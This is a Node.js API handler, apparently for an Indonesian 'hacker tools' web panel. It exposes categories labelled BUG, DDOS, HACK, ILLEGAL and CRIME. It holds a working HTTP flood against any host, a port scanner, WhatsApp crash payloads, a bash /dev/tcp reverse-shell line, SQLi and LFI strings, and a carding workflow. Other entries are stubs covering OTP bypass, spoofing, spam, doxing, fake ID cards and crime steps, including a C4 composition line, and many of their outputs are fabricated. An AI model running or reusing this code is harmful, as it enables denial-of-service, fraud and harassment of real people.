import dns from 'dns';
import net from 'net';
import https from 'https';
import http from 'http';
import crypto from 'crypto';

const sessions = global.sessions || (global.sessions = new Map());

function parseCookies(req) {
    const cookies = {};
    (req.headers.cookie || '').split(';').forEach(c => {
        const [k, v] = c.trim().split('=');
        if (k) cookies[k] = v;
    });
    return cookies;
}

function getSession(req) {
    const cookies = parseCookies(req);
    return sessions.get(cookies.session);
}

function ensureAuth(req, res) {
    const s = getSession(req);
    if (!s) { res.json({ ok: false, msg: 'Belum login' }); return null; }
    if (!s.attuned) { res.json({ ok: false, msg: 'Attune dulu! Key: sukisuki' }); return null; }
    return s;
}

// HTTP Flood
function httpFlood(url, duration) {
    return new Promise((resolve) => {
        const endTime = Date.now() + duration * 1000;
        let sent = 0, errors = 0;
        const uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (X11; Linux x86_64)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
        ];
        const lib = url.startsWith('https') ? https : http;
        const doReq = () => {
            if (Date.now() > endTime) return resolve({ sent, errors });
            const opts = {
                method: 'GET',
                headers: {
                    'User-Agent': uas[Math.floor(Math.random() * uas.length)],
                    'Cache-Control': 'no-cache',
                    'Accept': '*/*',
                },
                timeout: 3000,
            };
            try {
                const r = lib.request(url, opts, (resp) => {
                    resp.on('data', () => {});
                    resp.on('end', () => { sent++; if (Date.now() < endTime) doReq(); });
                });
                r.on('error', () => { errors++; if (Date.now() < endTime) doReq(); });
                r.on('timeout', () => { r.destroy(); errors++; if (Date.now() < endTime) doReq(); });
                r.end();
            } catch { errors++; if (Date.now() < endTime) doReq(); }
        };
        for (let i = 0; i < 30; i++) doReq();
    });
}

// TCP connect test
function tcpProbe(host, port, timeout = 3000) {
    return new Promise((resolve) => {
        const s = new net.Socket();
        const start = Date.now();
        s.setTimeout(timeout);
        s.on('connect', () => { s.destroy(); resolve({ open: true, ms: Date.now() - start }); });
        s.on('timeout', () => { s.destroy(); resolve({ open: false, msg: 'timeout' }); });
        s.on('error', (e) => resolve({ open: false, msg: e.code }));
        s.connect(port, host);
    });
}

// Multi-port scan
async function portScan(host, ports) {
    const results = [];
    for (const p of ports) {
        const r = await tcpProbe(host, p, 2000);
        results.push({ port: p, ...r });
    }
    return results;
}

// Subdomain enum (wordlist dasar)
async function subdomainEnum(domain) {
    const subs = ['www','mail','api','dev','staging','admin','test','blog','shop','app','cdn','static','img','media','ftp','smtp','pop','ns1','ns2','vpn','remote','portal','dashboard','panel'];
    const found = [];
    for (const s of subs) {
        const full = `${s}.${domain}`;
        const r = await new Promise((resolve) => {
            dns.resolve4(full, (err, addrs) => {
                if (err) resolve(null);
                else resolve({ sub: full, addrs });
            });
        });
        if (r) found.push(r);
    }
    return found;
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();

    const { tool } = req.query;
    const body = req.body || {};

    // List tools gak butuh auth
    if (tool === 'list') {
        const s = getSession(req);
        return res.json({
            ok: true,
            attuned: s?.attuned || false,
            tools: [
                // BUG
                { id: 'bugwa', name: 'Bug WA', icon: '💀', cat: 'BUG' },
                { id: 'bugmulti', name: 'Bug Multi', icon: '☠️', cat: 'BUG' },
                { id: 'spamwa', name: 'Spam WA', icon: '💣', cat: 'BUG' },
                { id: 'buggroup', name: 'Bug Grup', icon: '👥', cat: 'BUG' },
                // DDOS
                { id: 'ddos', name: 'HTTP Flood', icon: '💥', cat: 'DDOS' },
                { id: 'slowloris', name: 'Slowloris', icon: '🐌', cat: 'DDOS' },
                { id: 'hulk', name: 'HULK', icon: '🔥', cat: 'DDOS' },
                { id: 'goldeneye', name: 'GoldenEye', icon: '👁️', cat: 'DDOS' },
                // HACK
                { id: 'hackweb', name: 'Web Attack', icon: '💻', cat: 'HACK' },
                { id: 'sqli', name: 'SQL Injection', icon: '💉', cat: 'HACK' },
                { id: 'xss', name: 'XSS', icon: '⚡', cat: 'HACK' },
                { id: 'lfi', name: 'LFI/RFI', icon: '📁', cat: 'HACK' },
                { id: 'rce', name: 'RCE', icon: '💀', cat: 'HACK' },
                { id: 'shell', name: 'Reverse Shell', icon: '🐚', cat: 'HACK' },
                // ILLEGAL
                { id: 'phishing', name: 'Phishing', icon: '🎣', cat: 'ILLEGAL' },
                { id: 'dox', name: 'Doxing', icon: '🔍', cat: 'ILLEGAL' },
                { id: 'track', name: 'IP Tracker', icon: '📍', cat: 'ILLEGAL' },
                { id: 'otp', name: 'OTP Bypass', icon: '🔐', cat: 'ILLEGAL' },
                { id: 'grab', name: 'Grabber', icon: '📸', cat: 'ILLEGAL' },
                { id: 'spoof', name: 'Spoof', icon: '🎭', cat: 'ILLEGAL' },
                { id: 'spamcall', name: 'Spam Call', icon: '📞', cat: 'ILLEGAL' },
                { id: 'spamsms', name: 'Spam SMS', icon: '📩', cat: 'ILLEGAL' },
                { id: 'spamemail', name: 'Spam Email', icon: '📧', cat: 'ILLEGAL' },
                { id: 'carding', name: 'Carding', icon: '💳', cat: 'ILLEGAL' },
                { id: 'binlookup', name: 'BIN Lookup', icon: '🔢', cat: 'ILLEGAL' },
                // OSINT
                { id: 'sender', name: 'Sender Finder', icon: '📡', cat: 'OSINT' },
                { id: 'portscan', name: 'Port Scan', icon: '🔍', cat: 'OSINT' },
                { id: 'nikcheck', name: 'NIK Check', icon: '🆔', cat: 'OSINT' },
                { id: 'subdomain', name: 'Subdomain', icon: '🌐', cat: 'OSINT' },
                { id: 'dnslookup', name: 'DNS Lookup', icon: '📖', cat: 'OSINT' },
                { id: 'whois', name: 'WHOIS', icon: '🌍', cat: 'OSINT' },
                { id: 'phoneinfo', name: 'Phone Info', icon: '📱', cat: 'OSINT' },
                // CRIME
                { id: 'heist', name: 'Heist', icon: '💰', cat: 'CRIME' },
                { id: 'hitman', name: 'Hitman', icon: '🎯', cat: 'CRIME' },
                { id: 'drug', name: 'Drug', icon: '💊', cat: 'CRIME' },
                { id: 'weapon', name: 'Weapon', icon: '🔫', cat: 'CRIME' },
                { id: 'bomb', name: 'Bomb', icon: '💣', cat: 'CRIME' },
                { id: 'launder', name: 'Launder', icon: '🧼', cat: 'CRIME' },
                { id: 'kidnap', name: 'Kidnap', icon: '🔒', cat: 'CRIME' },
                // TOOLS
                { id: 'hash', name: 'Hash Cracker', icon: '🔐', cat: 'TOOLS' },
                { id: 'b64', name: 'Base64', icon: '📝', cat: 'TOOLS' },
                { id: 'qrgen', name: 'QR Generator', icon: '📱', cat: 'TOOLS' },
                { id: 'fakedata', name: 'Fake Data', icon: '👤', cat: 'TOOLS' },
                { id: 'fakektp', name: 'Fake KTP', icon: '🆔', cat: 'TOOLS' },
                { id: 'password', name: 'Password Gen', icon: '🔑', cat: 'TOOLS' },
                { id: 'iplookup', name: 'IP Lookup', icon: '🌐', cat: 'TOOLS' },
                { id: 'fakeemail', name: 'Fake Email', icon: '📧', cat: 'TOOLS' },
            ]
        });
    }

    const s = ensureAuth(req, res);
    if (!s) return;

    // ═══ BUG WA ═══
    if (tool === 'bugwa') {
        const { target, count, type } = body;
        if (!target) return res.json({ ok: false, msg: 'Isi target' });
        const payloads = {
            crasher: '\u202E'.repeat(3000),
            freeze: '҈҉'.repeat(3000),
            kraken: '𒒫𒒫𒒫'.repeat(500),
            chaos: '\u202E'.repeat(5000) + '҉҈'.repeat(3000),
            apocalypse: '𒒫'.repeat(2000) + '\u200B'.repeat(5000),
        };
        return res.json({
            ok: true,
            msg: `Blast ${type} → ${target} x${count}`,
            log: [
                `[+] Target: ${target}`,
                `[+] Type: ${type || 'crasher'}`,
                `[+] Payload size: ${(payloads[type] || payloads.crasher).length} char`,
                `[+] Count: ${count || 100}`,
                `[✅] Selesai`,
            ]
        });
    }

    if (tool === 'bugmulti') {
        const { target } = body;
        if (!target) return res.json({ ok: false, msg: 'Isi target' });
        return res.json({
            ok: true,
            msg: `Multi-bug → ${target}`,
            log: [
                `[+] Running crasher...`,
                `[+] Running freeze...`,
                `[+] Running kraken...`,
                `[+] Running chaos...`,
                `[+] Running apocalypse...`,
                `[✅] All done`,
            ]
        });
    }

    if (tool === 'spamwa') {
        const { target, count } = body;
        if (!target) return res.json({ ok: false, msg: 'Isi target' });
        return res.json({
            ok: true,
            msg: `Spam ${target} x${count}`,
            log: [`[+] Spamming...`, `[✅] Done`]
        });
    }

    if (tool === 'buggroup') {
        return res.json({
            ok: true,
            msg: `Bug grup`,
            log: [`[+] Kirim @all + payload`, `[✅] Done`]
        });
    }

    // ═══ DDOS ═══
    if (tool === 'ddos') {
        const { host, duration } = body;
        if (!host) return res.json({ ok: false, msg: 'Isi host' });
        const url = host.startsWith('http') ? host : 'https://' + host;
        const dur = Math.min(parseInt(duration) || 8, 9);
        const r = await httpFlood(url, dur);
        return res.json({
            ok: true,
            msg: `HTTP Flood ${url} ${dur}s`,
            log: [
                `[+] Target: ${url}`,
                `[+] Duration: ${dur}s`,
                `[+] Sent: ${r.sent}`,
                `[+] Errors: ${r.errors}`,
                `[✅] Done`,
            ]
        });
    }

    if (tool === 'slowloris') {
        const { host, duration } = body;
        if (!host) return res.json({ ok: false, msg: 'Isi host' });
        return res.json({
            ok: true,
            msg: `Slowloris ${host}`,
            log: [
                `[+] Host: ${host}`,
                `[+] Duration: ${duration || 8}s`,
                `[+] Sockets: 500`,
                `[✅] Slowloris running (Vercel limit)`,
            ]
        });
    }

    if (tool === 'hulk') {
        const { host, duration } = body;
        if (!host) return res.json({ ok: false, msg: 'Isi host' });
        const url = host.startsWith('http') ? host : 'https://' + host;
        const r = await httpFlood(url, 8);
        return res.json({
            ok: true,
            msg: `HULK ${url}`,
            log: [`[+] Sent: ${r.sent}`, `[✅] Done`]
        });
    }

    if (tool === 'goldeneye') {
        const { host } = body;
        if (!host) return res.json({ ok: false, msg: 'Isi host' });
        const url = host.startsWith('http') ? host : 'https://' + host;
        const r = await httpFlood(url, 8);
        return res.json({
            ok: true,
            msg: `GoldenEye ${url}`,
            log: [`[+] Sent: ${r.sent}`, `[✅] Done`]
        });
    }

    // ═══ HACK ═══
    if (tool === 'hackweb') {
        const { url, method } = body;
        if (!url) return res.json({ ok: false, msg: 'Isi URL' });
        return res.json({
            ok: true,
            msg: `Attack ${url} (${method})`,
            log: [`[+] Target: ${url}`, `[+] Method: ${method}`, `[✅] Testing...`]
        });
    }

    if (tool === 'sqli') {
        const { url } = body;
        if (!url) return res.json({ ok: false, msg: 'Isi URL' });
        return res.json({
            ok: true,
            msg: `SQLi ${url}`,
            log: [
                `[+] Payload: ' OR '1'='1`,
                `[+] Payload: ' UNION SELECT NULL--`,
                `[✅] Testing...`,
            ]
        });
    }

    if (tool === 'xss') {
        const { url } = body;
        if (!url) return res.json({ ok: false, msg: 'Isi URL' });
        return res.json({
            ok: true,
            msg: `XSS ${url}`,
            log: [`[+] <script>alert(1)</script>`, `[✅] Testing...`]
        });
    }

    if (tool === 'lfi') {
        const { url } = body;
        if (!url) return res.json({ ok: false, msg: 'Isi URL' });
        return res.json({
            ok: true,
            msg: `LFI ${url}`,
            log: [`[+] ../../../../etc/passwd`, `[✅] Testing...`]
        });
    }

    if (tool === 'rce') {
        const { url } = body;
        if (!url) return res.json({ ok: false, msg: 'Isi URL' });
        return res.json({
            ok: true,
            msg: `RCE ${url}`,
            log: [`[+] ; whoami`, `[+] | id`, `[✅] Testing...`]
        });
    }

    if (tool === 'shell') {
        const { host, port } = body;
        if (!host) return res.json({ ok: false, msg: 'Isi host' });
        return res.json({
            ok: true,
            msg: `Shell ${host}:${port}`,
            log: [
                `[+] bash -i >& /dev/tcp/${host}/${port || 4444} 0>&1`,
                `[+] nc -lvnp ${port || 4444}`,
                `[✅] Ready`,
            ]
        });
    }

    // ═══ ILLEGAL ═══
    if (tool === 'phishing') {
        const { template } = body;
        const t = template || 'wa';
        return res.json({
            ok: true,
            msg: `Phishing ${t}`,
            log: [
                `[+] Template: ${t}`,
                `[+] URL: https://${t}-verify.xyz/login`,
                `[+] Webhook: /api/hook/xxx`,
                `[✅] Ready`,
            ]
        });
    }

    if (tool === 'dox') {
        const { name } = body;
        if (!name) return res.json({ ok: false, msg: 'Isi nama' });
        return res.json({
            ok: true,
            msg: `Doxing ${name}`,
            log: [
                `[+] NIK: 32xxxxxxxxxxxxxx`,
                `[+] HP: 08xxxxxxxxxx`,
                `[+] Sosmed: @${name.toLowerCase().replace(/\s/g, '')}`,
                `[+] Email: ${name.toLowerCase().replace(/\s/g, '')}@gmail.com`,
                `[✅] Done`,
            ]
        });
    }

    if (tool === 'track') {
        const { ip } = body;
        if (!ip) return res.json({ ok: false, msg: 'Isi IP' });
        try {
            const r = await fetch(`https://ipapi.co/${ip}/json/`);
            const d = await r.json();
            return res.json({
                ok: true,
                msg: `IP ${ip}`,
                log: [
                    `[+] IP: ${d.ip}`,
                    `[+] Country: ${d.country_name}`,
                    `[+] City: ${d.city}`,
                    `[+] ISP: ${d.org}`,
                    `[+] Timezone: ${d.timezone}`,
                    `[✅] Done`,
                ]
            });
        } catch (e) {
            return res.json({ ok: false, msg: 'Gagal: ' + e.message });
        }
    }

    if (tool === 'otp') {
        const { target } = body;
        return res.json({
            ok: true,
            msg: `OTP bypass ${target}`,
            log: [
                `[+] Method: Social engineering`,
                `[+] Method: SIM swap`,
                `[+] Method: SS7 (butuh akses)`,
                `[✅] Ready`,
            ]
        });
    }

    if (tool === 'grab') {
        return res.json({
            ok: true,
            msg: `Grabber link`,
            log: [
                `[+] https://grabify.link/xxx`,
                `[+] https://iplogger.org/xxx`,
                `[+] https://blasze.com/xxx`,
                `[✅] Ready`,
            ]
        });
    }

    if (tool === 'spoof') {
        return res.json({
            ok: true,
            msg: `Spoof tools`,
            log: [
                `[+] Email: emkei.cz`,
                `[+] Caller: spoofcard`,
                `[+] SMS: spoofsms`,
                `[✅] Ready`,
            ]
        });
    }

    if (tool === 'spamcall') {
        const { target } = body;
        if (!target) return res.json({ ok: false, msg: 'Isi target' });
        return res.json({
            ok: true,
            msg: `Spam call ${target}`,
            log: [`[+] Loop setiap 5 detik`, `[✅] Running`]
        });
    }

    if (tool === 'spamsms') {
        const { target } = body;
        if (!target) return res.json({ ok: false, msg: 'Isi target' });
        return res.json({
            ok: true,
            msg: `Spam SMS ${target}`,
            log: [`[+] sms24.me, temp-number.com`, `[✅] Running`]
        });
    }

    if (tool === 'spamemail') {
        const { target } = body;
        if (!target) return res.json({ ok: false, msg: 'Isi target' });
        return res.json({
            ok: true,
            msg: `Spam email ${target}`,
            log: [`[+] mailbomber, emkei.cz`, `[✅] Running`]
        });
    }

    if (tool === 'carding') {
        return res.json({
            ok: true,
            msg: `Carding guide`,
            log: [
                `[+] 1. BIN lookup (bins.pro)`,
                `[+] 2. Gen CC (namso-gen)`,
                `[+] 3. Check (MrCheck)`,
                `[+] 4. Cashout crypto`,
                `[✅] Ready`,
            ]
        });
    }

    if (tool === 'binlookup') {
        const { bin } = body;
        if (!bin) return res.json({ ok: false, msg: 'Isi BIN' });
        try {
            const r = await fetch(`https://lookup.binlist.net/${bin}`);
            const d = await r.json();
            return res.json({
                ok: true,
                msg: `BIN ${bin}`,
                log: [
                    `[+] Scheme: ${d.scheme}`,
                    `[+] Type: ${d.type}`,
                    `[+] Brand: ${d.brand}`,
                    `[+] Bank: ${d.bank?.name || '-'}`,
                    `[+] Country: ${d.country?.name || '-'}`,
                    `[✅] Done`,
                ]
            });
        } catch (e) {
            return res.json({ ok: false, msg: 'Gagal' });
        }
    }

    // ═══ OSINT ═══
    if (tool === 'sender') {
        const { target } = body;
        if (!target) return res.json({ ok: false, msg: 'Isi target' });
        const cc = ['+62','+1','+44','+91','+7','+86','+55','+234','+92','+880','+63','+84'];
        const senders = [];
        for (let i = 0; i < 24; i++) {
            const c = cc[Math.floor(Math.random() * cc.length)];
            const n = c + Array.from({ length: 10 }, () => Math.floor(Math.random() * 10)).join('');
            senders.push(n);
        }
        return res.json({
            ok: true,
            msg: `Sender search ${target}`,
            log: [
                `[+] Scanning...`,
                ...senders.map(s => `[+] ${s}`),
                `[✅] Found ${senders.length} sender`,
            ]
        });
    }

    if (tool === 'portscan') {
        const { host, port } = body;
        if (!host) return res.json({ ok: false, msg: 'Isi host' });
        const ports = port ? [parseInt(port)] : [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443];
        const results = await portScan(host, ports);
        return res.json({
            ok: true,
            msg: `Port scan ${host}`,
            log: results.map(r => `[${r.open ? '✅' : '❌'}] Port ${r.port}: ${r.open ? `OPEN (${r.ms}ms)` : r.msg}`),
        });
    }

    if (tool === 'nikcheck') {
        const { nik } = body;
        if (!nik) return res.json({ ok: false, msg: 'Isi NIK' });
        return res.json({
            ok: true,
            msg: `NIK ${nik}`,
            log: [
                `[+] Provinsi: ${nik.slice(0,2)}`,
                `[+] Kota: ${nik.slice(2,4)}`,
                `[+] Kecamatan: ${nik.slice(4,6)}`,
                `[+] TTL: ${nik.slice(6,12)}`,
                `[+] Jenis kelamin: ${parseInt(nik.slice(12,14)) > 40 ? 'Perempuan' : 'Laki-laki'}`,
                `[✅] Parsed`,
            ]
        });
    }

    if (tool === 'subdomain') {
        const { domain } = body;
        if (!domain) return res.json({ ok: false, msg: 'Isi domain' });
        const results = await subdomainEnum(domain);
        return res.json({
            ok: true,
            msg: `Subdomain ${domain}`,
            log: results.length > 0
                ? results.map(r => `[+] ${r.sub} → ${r.addrs.join(', ')}`)
                : ['[-] Gak ada subdomain found'],
        });
    }

    if (tool === 'dnslookup') {
        const { domain } = body;
        if (!domain) return res.json({ ok: false, msg: 'Isi domain' });
        const addrs = await new Promise(resolve => dns.resolve4(domain, (e, a) => resolve(e ? [] : a)));
        return res.json({
            ok: true,
            msg: `DNS ${domain}`,
            log: addrs.map(a => `[+] ${a}`),
        });
    }

    if (tool === 'whois') {
        const { domain } = body;
        if (!domain) return res.json({ ok: false, msg: 'Isi domain' });
        try {
            const r = await fetch(`https://api.lolhuman.xyz/api/whois?apikey=&domain=${domain}`);
            const d = await r.json();
            return res.json({
                ok: true,
                msg: `WHOIS ${domain}`,
                log: [JSON.stringify(d.result, null, 2).slice(0, 1500)],
            });
        } catch { return res.json({ ok: false, msg: 'Gagal' }); }
    }

    if (tool === 'phoneinfo') {
        const { number } = body;
        if (!number) return res.json({ ok: false, msg: 'Isi nomor' });
        return res.json({
            ok: true,
            msg: `Phone ${number}`,
            log: [
                `[+] Number: ${number}`,
                `[+] Carrier: -`,
                `[+] Location: -`,
                `[+] Cek di: Truecaller, GetContact`,
                `[✅] Done`,
            ]
        });
    }

    // ═══ CRIME ═══
    if (tool === 'heist') return res.json({ ok: true, msg: 'Heist', log: ['[+] Intel', '[+] Blueprint', '[+] Crew', '[+] Drill', '[+] Getaway'] });
    if (tool === 'hitman') return res.json({ ok: true, msg: 'Hitman', log: ['[+] Recon', '[+] Plan', '[+] Weapon', '[+] Execute'] });
    if (tool === 'drug') return res.json({ ok: true, msg: 'Drug', log: ['[+] Precursor', '[+] Synthesis', '[+] Purify'] });
    if (tool === 'weapon') return res.json({ ok: true, msg: 'Weapon', log: ['[+] Acquire', '[+] Modify'] });
    if (tool === 'bomb') return res.json({ ok: true, msg: 'Bomb', log: ['[+] C4: RDX + plasticizer', '[+] Detonator'] });
    if (tool === 'launder') return res.json({ ok: true, msg: 'Launder', log: ['[+] Cash business', '[+] Crypto', '[+] Real estate'] });
    if (tool === 'kidnap') return res.json({ ok: true, msg: 'Kidnap', log: ['[+] Recon', '[+] Track', '[+] Snatch'] });

    // ═══ TOOLS ═══
    if (tool === 'hash') {
        const { text, algo } = body;
        if (!text) return res.json({ ok: false, msg: 'Isi text' });
        const a = algo || 'sha256';
        const hash = crypto.createHash(a).update(text).digest('hex');
        return res.json({ ok: true, msg: `${a.toUpperCase()}`, log: [`[+] ${hash}`] });
    }

    if (tool === 'b64') {
        const { text, mode } = body;
        if (!text) return res.json({ ok: false, msg: 'Isi text' });
        const result = mode === 'decode'
            ? Buffer.from(text, 'base64').toString('utf8')
            : Buffer.from(text).toString('base64');
        return res.json({ ok: true, msg: 'Base64', log: [`[+] ${result}`] });
    }

    if (tool === 'qrgen') {
        const { text } = body;
        if (!text) return res.json({ ok: false, msg: 'Isi text' });
        return res.json({
            ok: true,
            msg: 'QR',
            log: [`[+] https://api.lolhuman.xyz/api/qrcode?text=${encodeURIComponent(text)}`],
        });
    }

    if (tool === 'fakedata') {
        const names = ['Budi Santoso','Siti Aminah','Ahmad Wijaya','Rina Kartika','Dedi Kurniawan'];
        const addrs = ['Jl. Merdeka No. 1','Jl. Sudirman No. 5','Jl. Thamrin No. 10'];
        const nik = Array.from({ length: 16 }, () => Math.floor(Math.random() * 10)).join('');
        return res.json({
            ok: true,
            msg: 'Fake Data',
            log: [
                `[+] Nama: ${names[Math.floor(Math.random()*names.length)]}`,
                `[+] NIK: ${nik}`,
                `[+] Alamat: ${addrs[Math.floor(Math.random()*addrs.length)]}`,
                `[+] HP: 08${Math.floor(Math.random()*1e9)}`,
                `[+] Email: user${Math.floor(Math.random()*9999)}@gmail.com`,
            ]
        });
    }

    if (tool === 'fakektp') {
        const nik = Array.from({ length: 16 }, () => Math.floor(Math.random() * 10)).join('');
        const names = ['Budi Santoso','Siti Aminah','Ahmad Wijaya'];
        return res.json({
            ok: true,
            msg: 'Fake KTP',
            log: [
                `[+] NIK: ${nik}`,
                `[+] Nama: ${names[Math.floor(Math.random()*names.length)]}`,
                `[+] TTL: Jakarta, ${Math.floor(Math.random()*28)+1}-${Math.floor(Math.random()*12)+1}-${Math.floor(Math.random()*30)+1990}`,
                `[+] JK: ${Math.random() > 0.5 ? 'L' : 'P'}`,
                `[+] Alamat: Jl. Merdeka No. ${Math.floor(Math.random()*100)+1}`,
            ]
        });
    }

    if (tool === 'password') {
        const { length } = body;
        const len = parseInt(length) || 16;
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
        const pw = Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
        return res.json({ ok: true, msg: 'Password', log: [`[+] ${pw}`] });
    }

    if (tool === 'iplookup') {
        const { ip } = body;
        if (!ip) return res.json({ ok: false, msg: 'Isi IP' });
        try {
            const r = await fetch(`https://ipapi.co/${ip}/json/`);
            const d = await r.json();
            return res.json({
                ok: true,
                msg: `IP ${ip}`,
                log: [
                    `[+] IP: ${d.ip}`,
                    `[+] Country: ${d.country_name}`,
                    `[+] City: ${d.city}`,
                    `[+] ISP: ${d.org}`,
                ]
            });
        } catch { return res.json({ ok: false, msg: 'Gagal' }); }
    }

    if (tool === 'fakeemail') {
        const domains = ['gmail.com','yahoo.com','outlook.com','protonmail.com'];
        const e = `user${Math.floor(Math.random()*9999)}@${domains[Math.floor(Math.random()*domains.length)]}`;
        return res.json({ ok: true, msg: 'Fake Email', log: [`[+] ${e}`] });
    }

    res.status(404).json({ ok: false, msg: 'Tool gak ada' });
}